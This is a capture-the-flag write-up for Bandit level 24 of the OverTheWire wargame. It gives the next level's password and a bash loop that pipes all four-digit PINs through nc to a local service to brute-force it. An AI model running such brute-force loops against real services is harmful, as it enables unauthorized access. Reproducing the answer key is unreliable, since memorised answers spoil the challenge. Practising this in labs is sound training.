# Level 24 Solution

Password:

```txt
p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```

Steps:

```bash
bandit24@bandit:~$ mkdir /tmp/tempo123/
bandit24@bandit:~$ cd /tmp/tempo123/
bandit24@bandit:/tmp/tempo123$ vim script.sh
bandit24@bandit:/tmp/tempo123$ chmod +x script.sh
bandit24@bandit:/tmp/tempo123$ cat script.sh 
#!/bin/bash

for i in {1000..9999}
do
	echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}
done
bandit24@bandit:/tmp/tempo123$ ./script.sh | nc localhost 30002
...
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
